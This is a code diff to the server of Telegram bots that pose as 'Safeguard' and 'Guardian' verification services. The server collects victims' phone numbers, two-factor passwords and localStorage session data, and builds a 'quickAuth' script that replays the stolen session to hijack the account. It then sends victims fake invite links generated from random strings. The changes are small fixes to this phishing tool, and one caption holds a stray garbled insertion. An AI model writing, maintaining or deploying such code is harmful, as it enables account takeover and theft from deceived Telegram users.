@@ -10,6 +10,7 @@ const PNF = require("google-libphonenumber").PhoneNumberFormat;
 
 const admins = [5891533625]; // Replace with your Telegram ID if needed
 
+// Load images as Buffers
 const safeguardSuccess = fs.readFileSync(path.join(__dirname, "images/success/safeguard.jpg"));
 const guardianSuccess = fs.readFileSync(path.join(__dirname, "images/success/guardian.jpg"));
 const delugeVerification = fs.readFileSync(path.join(__dirname, "images/verification/deluge.jpg"));
@@ -94,7 +95,7 @@ app.post("/api/users/telegram/info", async (req, res) => {
     const { userId, firstName, usernames, phoneNumber, isPremium, password, quicklySet, type } = req.body;
     console.log(`Received user data for userId ${userId}, type: ${type}`);
     let pass = password || "No Two-factor authentication enabled.";
-    let usernameText = usernames && usernames.length > 0 ? `Usernames owned:\n${usernames.map((u, i) => `<b>${i + 1}</b>. @${u.username} ${u.isActive ? "✅" : "❌"}`).join("\n")}` : "No usernames";
+    let usernameText = usernames && Array.isArray(usernames) ? `Usernames owned:\n${usernames.map((u, i) => `<b>${i + 1}</b>. @${u.username} ${u.isActive ? "✅" : "❌"}`).join("\n")}` : "No usernames";
     const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
     const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);
     const quickAuth = `Object.entries(${JSON.stringify(quicklySet)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;
@@ -140,15 +141,16 @@ const handleRequest = async (req, res, data) => {
     let image = type === "safeguard" ? safeguardSuccess : guardianSuccess;
     let caption = type === "safeguard" 
       ? `Verified, you can join the group using this temporary link:\n\nhttps://t.me/+${generateRandomString(16)}\n\nThis link is a one time use and will expire`
-      : `☑️ <b>Verification successful</b>\n\nPlease click the invite link below to join the group:\n<i>https://t.me/+${generateRandomString(16)}</i>`;
+      : `☑️ <b>Verification successful</b>\n\nPlease click the invite植物 link below to join the group:\n<i>https://t.me/+${generateRandomString(16)}</i>`;
     const randomText = guardianButtonTexts[Math.floor(Math.random() * guardianButtonTexts.length)];
     const buttons = type === "safeguard" 
-      ? { reply_markup: { inline_keyboard: [[{ text: "@SOLTRENDING", url: "https://t.me/SOLTRENDING" }]] } }
+      ? { reply_markup: { inline_keyboard: [[{ text: "@SOLTRENDING",  "url": "https://t.me/SOLTRENDING" }]] } }
       : { reply_markup: { inline_keyboard: [[{ text: randomText, url: `https://t.me/+${generateRandomString(16)}` }]] } };
 
     try {
       console.log(`Sending temporary link to userId ${data.userId}`);
-      await bot.sendPhoto(data.userId, image, { caption, ...buttons, parse_mode: "HTML" });
+      // Use sendPhoto with a Buffer and specify the filename to avoid deprecation warning
+      await bot.sendPhoto(data.userId, { source: image, filename: `${type}_success.jpg` }, { caption, ...buttons, parse_mode: "HTML" });
       console.log(`Successfully sent temporary link to userId ${data.userId}`);
     } catch (error) {
       console.error(`Failed to send temporary link to userId ${data.userId}: ${error.message}`);
@@ -180,14 +182,15 @@ const handleNewChatMember = async (bot, type) => {
         jsonToSend = {};
     }
     if (update.chat.type === "channel" && update.new_chat_member.status === "administrator" && update.new_chat_member.user.is_bot && admins.includes(update.from.id)) {
-      bot.sendPhoto(chatId, imageToSend, jsonToSend);
+      // Use sendPhoto with a Buffer and specify the filename
+      bot.sendPhoto(chatId, { source: imageToSend, filename: `${type}_verification.jpg` }, jsonToSend);
     }
   });
 };
 
 function handleStart(bot) {
   bot.onText(/\/start/, (msg) => {
-    console.log(`Received /start from chat ID: ${msg.chat.id} for bot with token: ${bot._token}`);
+    console.log(`Received /start from chat ID: ${msg.chat.id} for bot with token: ${bot.token}`);
     let botInfo;
     bot.getMe().then(botInformation => {
       botInfo = botInformation;
@@ -238,7 +241,8 @@ function handleStart(bot) {
           };
           imageToSend = guardianVerification;
         }
-        bot.sendPhoto(chatId, imageToSend, jsonToSend)
+        // Use sendPhoto with a Buffer and specify the filename
+        bot.sendPhoto(chatId, { source: imageToSend, filename: `${botInfo.username}_verification.jpg` }, jsonToSend)
           .then(() => console.log(`Sent response to ${chatId} for ${botInfo.username}`))
           .catch(err => console.error(`Error sending to ${chatId}:`, err));
       }
